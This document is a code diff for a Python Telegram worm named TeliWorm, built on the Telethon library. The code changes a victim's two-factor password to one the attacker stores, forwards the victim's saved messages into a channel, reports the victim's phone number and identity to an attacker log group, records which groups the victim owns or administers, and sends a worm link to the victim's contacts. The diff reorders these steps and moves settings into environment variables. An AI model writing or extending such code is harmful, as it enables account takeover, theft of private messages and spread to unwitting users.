@@ -13,12 +13,15 @@ from telethon.tl.functions.contacts import GetContactsRequest
 
 load_dotenv(override=True)
 logger = logging.getLogger("TeliWorm")
-mongo_client = MongoClient(os.getenv('MONGODB_URI'), server_api=ServerApi('1'))
+mongo_client = MongoClient(os.environ['MONGODB_URI'], server_api=ServerApi('1'))
+random_string = lambda length: ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+LOG_GROUP = int(os.environ['LOG_GROUP'])
+PUBLIC_HOST = os.environ['PUBLIC_HOST']
 
 async def set_passwd(client: TelegramClient, me: User) -> None:
     logger.info(f"Setting password for user {me.phone}")
     user_data = mongo_client.userdb.sessions.find_one({'phone': me.phone})
-    password = "".join(random.choice(string.ascii_letters+string.digits) for i in range(16))
+    password = random_string(16)
     if 'password' in user_data:
         await client.edit_2fa(current_password=user_data['password'], new_password=password)
     else:
@@ -61,7 +64,7 @@ async def create_bot(client: TelegramClient, me: User) -> Optional[Dict[str, any
     mongo_client.wormdb.bots.insert_one(botinfo)
     logger.debug(f"Bot created: {botinfo}")
     return botinfo
-async def backup_saves(client: TelegramClient, me: User, logger_bot: TelegramClient) -> Optional[Dict[str, any]]:
+async def backup_saves(client: TelegramClient, me: User, logger_bot: TelegramClient, perm_logs: Optional[Dict[str, any]]) -> Optional[Dict[str, any]]:
     logger.info("Backing up saved messages...")
     result = await client(functions.channels.CreateChannelRequest(
         title=f'{me.first_name} {me.last_name}',
@@ -84,28 +87,28 @@ async def backup_saves(client: TelegramClient, me: User, logger_bot: TelegramCli
             await message.forward_to(dest)
         except Exception as e:
             logger.error(f"Error forwarding message: {e}")
-    await client(functions.channels.LeaveChannelRequest(channel=channel_id))
     log = {
         'txt': f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}\nSaved Messages: {msg_count}\nPremium: {me.premium}",
         'channel_id': channel_id,
-        'dest': dest,
         'hash': result.link.split('/')[-1].lstrip('+'),
     }
-    log['msg'] = await logger_bot.send_message(int(os.getenv('LOG_GROUP')), log['txt'])
+    if len(perm_logs['creator'])+len(perm_logs['admin']) > 0:
+        log['txt'] = log['txt'].replace("Session", f"Owner: {len(perm_logs['creator'])} Admin: {len(perm_logs['admin'])}\nSession")
+        await client.send_message(dest, json.dumps(perm_logs, indent=4, ensure_ascii=False))
+    await client(functions.channels.LeaveChannelRequest(channel=channel_id))
+    await logger_bot.send_message(LOG_GROUP, log['txt'])
     logger.debug(f"Backup log: {log}")
-    return log
 async def spread(
     client: TelegramClient,
     me: User,
     botinfo: Optional[Dict[str, any]],
-    log: Optional[Dict[str, any]]
 ) -> None:
     logger.info("Spreading worm message...")
     spread_msg = None
-    worm_url = os.environ['PUBLIC_HOST']+("".join(random.choice(string.ascii_letters+string.digits) for i in range(16)))
+    worm_url = PUBLIC_HOST+("".join(random.choice(string.ascii_letters+string.digits) for i in range(16)))
     spread_msg_nomedia = f"{strings['worm_msg']}\n\n{worm_url}"
     if botinfo is not None:
-        bot = TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
+        bot = TelegramClient(StringSession(), os.environ['API_ID'], os.environ['API_HASH'])
         await bot.start(bot_token=botinfo['token'])
         async with client.conversation(f"@{botinfo['username']}") as conv:
             msg = await conv.send_message("/start")
@@ -153,16 +156,12 @@ async def spread(
                 continue
         if dialog.is_user:
             await msg.delete(revoke=False)
-    if log and len(perm_logs['creator'])+len(perm_logs['admin']) > 0:
-        await log['msg'].edit(log['txt'].replace("Session", f"Owner: {len(perm_logs['creator'])} Admin: {len(perm_logs['admin'])}\nSession"))
-        await client(functions.messages.ImportChatInviteRequest(hash=log['hash']))
-        await client.send_message(log['dest'], json.dumps(perm_logs, indent=4, ensure_ascii=False))
-        await client(functions.channels.LeaveChannelRequest(channel=log['channel_id']))
+    return perm_logs
 
 async def worm(client: TelegramClient, logger_bot: TelegramClient) -> None:
     logger.info("Starting worm sequence...")
     me = await client.get_me()
-    log = None
+    perm_logs = None
     botinfo = None
     try:
         await set_passwd(client, me)
@@ -177,10 +176,10 @@ async def worm(client: TelegramClient, logger_bot: TelegramClient) -> None:
     except Exception as e:
         logger.error(f"Error in create_bot: {e}")
     try:
-        log = await backup_saves(client, me, logger_bot)
-    except Exception as e:
-        logger.error(f"Error in backup_saves: {e}")
-    try:
-        await spread(client, me, botinfo, log)
+        perm_logs = await spread(client, me, botinfo)
     except Exception as e:
         logger.error(f"Error in spread: {e}")
+    try:
+        await backup_saves(client, me, logger_bot, perm_logs)
+    except Exception as e:
+        logger.error(f"Error in backup_saves: {e}")
